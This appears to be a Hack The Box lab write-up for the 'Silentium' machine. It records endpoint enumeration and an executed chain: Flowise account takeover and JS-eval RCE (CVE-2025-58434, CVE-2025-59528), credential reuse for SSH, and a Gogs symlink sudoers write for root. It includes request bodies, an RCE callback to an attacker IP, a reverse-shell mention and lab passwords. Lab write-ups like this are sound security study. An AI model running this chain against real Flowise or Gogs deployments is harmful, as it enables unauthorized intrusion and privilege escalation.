# Silentium (HTB 867) — 10.129.106.125 (respawned; was .121)

## OWNED — 2026-08-29

| Flag | Value | HTB Submit |
|---|---|---|
| user | `d9c4e61d327dc597251a859fd3e9f574` | **accepted** |
| root | `c460b0ed31c97b4aa4e84b989ad7bbe1` | **accepted** |

## App identity
- **Public site (`silentium.htb`)** — custom static marketing SPA ("Institutional Capital & Lending Solutions"). Decoy surface; no backend API. Vanilla JS loan calculator in `/assets/app.js` (no obfuscation, no hidden endpoints).
- **Hidden app (`staging.silentium.htb`)** — **Flowise 3.0.5** (open-source LLM orchestration / AI agent builder). React SPA, Node.js backend. Confirmed via `GET /api/v1/version` → `{"version":"3.0.5"}`.
- Stack: **nginx 1.24.0 (Ubuntu)** reverse proxy → static files (main vhost) + Flowise app (staging vhost).

## Discovery
| Signal | Detail |
|---|---|
| IP `:80` | 301 → `http://silentium.htb/` for all paths (Host-header required) |
| Main vhost | 200, 8753 B static HTML; **all unknown paths return same SPA shell** (catch-all) |
| Vhost fuzz | `staging.silentium.htb` → 200, 3142 B — **Flowise** (only distinct vhost found) |
| ffuf on IP | All 29,770 paths → 301 (redirect to silentium.htb); no hidden dirs on IP |
| Team page hint | "Ben" — Head of Financial Systems → correlates with `ben@silentium.htb` Flowise account |

## Endpoint map

### silentium.htb (decoy)
| Path | Method | Status | Notes |
|---|---|---|---|
| `/` | GET | 200 | Marketing SPA, 8753 B |
| `/assets/app.js`, `/assets/styles.css` | GET | 200 | Static; calculator-only JS |
| `/*` (any other path) | GET | 200 | Same 8753 B SPA shell (nginx catch-all) |
| `/assets/` | GET | 403 | Directory listing disabled |
| `/api` | POST | 405 | nginx "Not Allowed" (no backend) |

### staging.silentium.htb (Flowise 3.0.5)
| Path | Method | Status | Auth | Notes |
|---|---|---|---|---|
| `/` | GET | 200 | — | Flowise React SPA |
| `/api/v1/version` | GET | 200 | **No** | `{"version":"3.0.5"}` |
| `/api/v1/ping` | GET | 200 | **No** | `pong` |
| `/api/v1/pricing` | GET | 200 | **No** | Plan tiers JSON |
| `/api/v1/settings` | GET | 200 | **No** | `{"PLATFORM_TYPE":"open source"}` |
| `/api/v1/account/basic-auth` | GET | 200 | **No** | `{"isUsernamePasswordSet":true}` |
| `/api/v1/account/forgot-password` | POST | 200/404/500 | **No** | Body: `{"user":{"email":"..."}}` — **CVE-2025-58434** (token leak in response for valid users) |
| `/api/v1/account/reset-password` | POST | — | **No** | Accepts `tempToken` + new password |
| `/api/v1/account/register` | POST | 400 | **No** | `"You can only have one organization"` (registration closed) |
| `/api/v1/login` | POST | 401 | — | `{"username","password"}` or `{"email","password"}` → `Unauthorized Access` |
| `/api/v1/chatflows` | GET | 401 | Yes | Chatflow list |
| `/api/v1/credentials` | GET | 401 | Yes | Stored API keys/creds |
| `/api/v1/node-load-method/customMCP` | POST | 401 | Yes | **CVE-2025-59528** — JS eval RCE via `mcpServerConfig` |
| `/api/v1/prediction` | POST | 401 | Yes | Chatflow inference |
| `/api/v1/public-chatflows/:id` | GET | 412/500 | Partial | Needs chatflow ID |
| `/api/v1/feedback/:id` | GET | 412 | Partial | Needs chatflow ID |
| `/api/v1/leads/:id` | GET | 412 | Partial | Needs chatflow ID |
| `/*` (unknown) | GET | 200 | — | SPA fallback (3142 B shell) |

## Auth model
- **Main site:** none.
- **Flowise:** username/password login (`/api/v1/login`); org already provisioned (single-org instance). Registration disabled.
- **Known valid user:** `ben@silentium.htb` (forgot-password returns DB transaction error vs `"User Not Found"` for others).
- **Session:** JWT/API key after login; most `/api/v1/*` routes return `{"error":"Unauthorized Access"}` without token.
- **Unauthenticated attack surface:** `forgot-password` → password reset token returned in API response (CVE-2025-58434, affects ≤3.0.5).

## Suspected vulns (ranked)
1. **CVE-2025-58434 — Unauthenticated account takeover** (`POST /api/v1/account/forgot-password`) — reset `tempToken` leaked in JSON response for valid users. Target: `ben@silentium.htb`. CVSS 9.8.
2. **CVE-2025-59528 — Authenticated RCE** (`POST /api/v1/node-load-method/customMCP`) — `mcpServerConfig` evaluated via `Function()` constructor; arbitrary Node.js code execution. Requires auth from step 1. CVSS 10.0. Affects ≤3.0.5.
3. **Internal services (post-foothold)** — **CONFIRMED:** local **Gogs** on `127.0.0.1:3001` (runs as **root**). Open registration with image captcha. CVE-2025-8110 symlink write → `/etc/sudoers.d/ben`.

## Attack chain (executed)

1. **CVE-2025-58434** — `POST /api/v1/account/forgot-password` → `tempToken` in JSON → reset password → `POST /api/v1/auth/login` (session cookies).
2. **CVE-2025-59528** — `POST /api/v1/node-load-method/customMCP` with header `x-request-from: internal` and payload `({x:(function(){...})()})` (outer parens required). Blind RCE as **root inside Docker container**.
3. **Container escape (cred leak)** — `env` in container exposes `SMTP_PASSWORD=r04D!!_R4ge` (SSH for `ben@silentium.htb`). Flowise cred: `F1l3_d0ck3r`.
4. **SSH** — `ben@10.129.106.125` / `r04D!!_R4ge` → user flag `/home/ben/user.txt`.
5. **CVE-2025-8110 (Gogs)** — Register on `http://127.0.0.1:3001` (OCR captcha), create repo, push symlink `malicious_link → /etc/sudoers.d/ben`, `PUT /api/v1/repos/{user}/{repo}/contents/malicious_link` with base64 payload `ben ALL=(ALL) NOPASSWD: ALL`. Gogs (root) follows symlink → passwordless sudo → root flag.

## RCE proof

Callback to attacker `10.10.15.143:9999` after authenticated customMCP:
```
GET /rce-dWlkPTAocm9vdCkgZ2lkPTAocm9vdCkgZ3JvdXBzPTAocm9vdCksMChyb290KSwxKGJpbiksMihkYWVtb24pLDMoc3lzKSw0KGFkbSksNihkaXNrKSwxMCh3aGVlbCksMTEoZmxvcHB5KSwyMChkaWFsb3V0KSwyNih0YXBlKSwyNyh2aWRlbykK
```
→ `uid=0(root)` (container). nc mkfifo reverse shell also received on `:4444`.

## Loot (exploits)
1. **Vhost:** Add `staging.silentium.htb` (or use `-H "Host: staging.silentium.htb"` / `--resolve` won't work for subdomain — use Host header against IP).
2. **Account takeover:** `POST /api/v1/account/forgot-password` with `{"user":{"email":"ben@silentium.htb"}}` → extract `tempToken` from response → `POST /api/v1/account/reset-password` → login via `/api/v1/login` → obtain JWT/API key.
3. **RCE:** Authenticated `POST /api/v1/node-load-method/customMCP` with crafted `mcpServerConfig` IIFE payload → reverse shell.
4. **Privesc:** Enumerate as shell user; look for local Gogs (~8080/3000) and other internal services. Public chain: Gogs CVE-2025-8110 symlink/file-write as root.
5. **SSH (22):** Likely usable after cred recovery from foothold; OpenSSH 9.6p1 Ubuntu — no known direct exploit.

- `loot/flowise_rce.py` — CVE-2025-58434 + CVE-2025-59528 chain
- `loot/gogs_remote.py` — CVE-2025-8110 sudoers privesc (run on target as ben)
- `loot/gogs_register.py` — Gogs registration w/ OCR captcha
- `loot/index.html` — main site
- `loot/staging-index.html` — Flowise SPA shell
- `loot/flowise-version.json` — `{"version":"3.0.5"}`
- `loot/app.js` — main site calculator JS
- `nmap/services.txt`, `nmap/allports.txt` — ports 22, 80 only

## Curl reference
```bash
# Main site
curl --resolve silentium.htb:80:10.129.106.121 http://silentium.htb/

# Flowise staging (Host header — subdomain not in --resolve)
curl -H "Host: staging.silentium.htb" http://10.129.106.121/api/v1/version
```
